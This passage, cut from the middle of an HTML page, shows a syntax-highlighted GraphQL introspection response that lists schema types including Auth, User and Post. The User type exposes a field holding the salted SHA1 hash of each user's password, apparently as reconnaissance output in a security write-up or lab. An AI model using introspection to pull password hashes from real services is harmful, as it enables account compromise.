class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;UNION&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Location adjacent to an input object field definition.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_FIELD_DEFINITION&#34;</span><span class="p">}],</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__DirectiveLocation&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Auth info for a user&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The token&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;token&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;user&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Auth&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;An enum describing what kind of type a given `__Type` is&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:[{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an enum. `enumValues` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an input object. `inputFields` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INPUT_OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a list. `ofType` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a non-null. `ofType` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a scalar.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an object. `fields` and `interfaces` are valid fields.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is an interface. `fields` and `possibleTypes` are valid fields.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;INTERFACE&#34;</span><span class="p">},{</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Indicates this type is a union. `possibleTypes` is a valid field.&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;UNION&#34;</span><span class="p">}],</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;ENUM&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__TypeKind&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `Boolean` scalar type represents `true` or `false`.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecationReason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Boolean&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__EnumValue&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A user of our website&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The id of the user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;id&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The salted SHA1 hash of the users password&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;password&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The username of the user&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;username&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The `Int` scalar type represents non-fractional signed whole numeric values. Int can represent values between -(2^31) and 2^31 - 1. &#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;A cool post written by one of our users&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The writter of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;author&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;User&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The content os the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;content&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The id of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;id&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Int&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Image of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;image&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;The name of the post&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;name&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}],</span><span class="nt">&#34;inputFields&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;interfaces&#34;</span><span class="p">:[],</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Post&#34;</span><span class="p">,</span><span class="nt">&#34;possibleTypes&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">},{</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.&#34;</span><span class="p">,</span><span class="nt">&#34;enumValues&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;fields&#34;</span><span class="p">:[{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;args&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;LIST&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;OBJECT&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;__InputValue&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}}}}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;deprecationReason&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;description&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;SCALAR&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;String&#34;</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">}},{</span><span class="nt">&#34;args&#34;</span><span class="p">:[],</span><span class="nt">&#34;deprecationReason&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;description&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;isDeprecated&#34;</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;isDeprecated&#34;</span><span class="p">,</span><span class="nt">&#34;type&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span class="s2">&#34;NON_NULL&#34;</span><span class="p">,</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;ofType&#34;</span><span class="p">:{</span><span class="nt">&#34;kind&#34;</span><span class="p">:</span><span 